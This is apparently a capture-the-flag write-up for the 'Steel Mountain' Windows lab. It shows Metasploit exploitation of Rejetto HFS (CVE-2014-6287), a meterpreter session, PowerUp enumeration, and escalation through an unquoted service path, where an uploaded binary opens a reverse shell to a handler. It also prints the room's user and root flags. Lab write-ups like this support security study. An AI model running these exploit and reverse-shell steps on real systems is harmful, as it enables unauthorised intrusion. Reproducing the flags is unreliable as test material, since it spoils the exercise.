# Information

Name: Steel Mountain

Difficulty: Easy

Description: Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

## Introduction

Deploy the machine.

**Who is the employee of the month?**

bill harper

![image](https://user-images.githubusercontent.com/43668197/140385630-4de1afad-0d8d-438f-a57c-d3dc5537da09.png)

![image](https://user-images.githubusercontent.com/43668197/140385676-2cb1f41d-e012-4160-8d03-57cfcc2d09ce.png)

Viewing the page source shows the image saved as the employees name. Also giving us a possible username.

## Initial Access

```
└─# nmap -sV -sC 10.10.121.200
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 12:56 EDT
Nmap scan report for 10.10.121.200
Host is up (0.22s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2021-11-03T16:53:51
|_Not valid after:  2022-05-05T16:53:51
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2021-11-04T16:59:39+00:00
|_ssl-date: 2021-11-04T16:59:43+00:00; +1s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2021-11-04T16:59:38
|_  start_date: 2021-11-04T16:53:42
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:03:42:f1:26:f7 (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 217.93 seconds
```

**Scan the machine with nmap. What is the other port running a web server on?**

8080

**Take a look at the other web server. What file server is running?**

rejetto http file server

![image](https://user-images.githubusercontent.com/43668197/140386842-1c4317e1-102d-42de-b366-b3c08a561799.png)

![image](https://user-images.githubusercontent.com/43668197/140386895-048a6a18-ebea-4062-90f6-409d2786bcf0.png)

![image](https://user-images.githubusercontent.com/43668197/140386959-cf6a0c2a-bc38-409b-a4d7-0cb2c7cb7566.png)


**What is the CVE number to exploit this file server?**

2014-6287

![image](https://user-images.githubusercontent.com/43668197/140387240-a7396d53-5576-4200-8d03-eab3d5c64ae8.png)

**Use Metasploit to get an initial shell. What is the user flag?**

b04763b6fcf51fcd7c13abc7db4fd365

![image](https://user-images.githubusercontent.com/43668197/140387530-82adece1-2840-4e8f-8605-dcf5e994e4c9.png)

Set rhost targetip, set rport 8080, set srvport 9987, set lhost tun0, run.

It took a couple attempts to get the meterpreter prompt.

```
meterpreter > shell
Process 976 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd C:\Users\bill\Desktop
cd C:\Users\bill\Desktop

C:\Users\bill\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill\Desktop

09/27/2019  09:08 AM    <DIR>          .
09/27/2019  09:08 AM    <DIR>          ..
09/27/2019  05:42 AM                70 user.txt
               1 File(s)             70 bytes
               2 Dir(s)  44,155,105,280 bytes free

C:\Users\bill\Desktop>type user.txt
type user.txt
b04763b6fcf51fcd7c13abc7db4fd365
```

## Privilege Escalation

```
meterpreter > upload /home/kali/Downloads/PowerUp.ps1
[*] uploading  : /home/kali/Downloads/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/kali/Downloads/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /home/kali/Downloads/PowerUp.ps1 -> PowerUp.ps1
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > 
```

**Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?**

AdvancedSystemCareService9

```
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

![image](https://user-images.githubusercontent.com/43668197/140391310-66dc7487-731a-4fcb-b844-80c122ae414c.png)


```
Listing: C:\Program Files (x86)\IObit
=====================================

Mode             Size   Type  Last modified              Name
----             ----   ----  -------------              ----
40777/rwxrwxrwx  32768  dir   2019-09-26 11:17:30 -0400  Advanced SystemCare
40777/rwxrwxrwx  16384  dir   2019-09-26 11:17:48 -0400  IObit Uninstaller
40777/rwxrwxrwx  4096   dir   2019-09-26 11:17:46 -0400  LiveUpdate

meterpreter > upload Advanced.exe
[*] uploading  : /home/kali/Downloads/Advanced.exe -> Advanced.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /home/kali/Downloads/Advanced.exe -> Advanced.exe
[*] uploaded   : /home/kali/Downloads/Advanced.exe -> Advanced.exe
```
```
meterpreter > powershell_shell
PS > Stop-Service AdvancedSystemCareService9
PS > Start-Service AdvancedSystemCareService9
```

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 1234
lport => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.13.29.43:1234 
[*] Command shell session 1 opened (10.13.29.43:1234 -> 10.10.121.200:49280 ) at 2021-11-04 14:05:14 -0400


Shell Banner:
Microsoft Windows [Version 6.3.9600]
-----
          

C:\Windows\system32>cd C:\Users\Administrator\Desktop
```

```
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\Administrator\Desktop

10/12/2020  12:05 PM    <DIR>          .
10/12/2020  12:05 PM    <DIR>          ..
10/12/2020  12:05 PM             1,528 activation.ps1
09/27/2019  05:41 AM                32 root.txt
               2 File(s)          1,560 bytes
               2 Dir(s)  44,153,552,896 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80
```

**What is the root flag?**

9af5f314f57607c00fd09803a587db80

## Access and Escalation Without Metasploit

**What powershell -c command could we run to manually find out the service name?**

powershell -c Get-Service

![image](https://user-images.githubusercontent.com/43668197/140397700-6b4290f1-af7b-4bd7-b564-21c49e21ea4c.png)


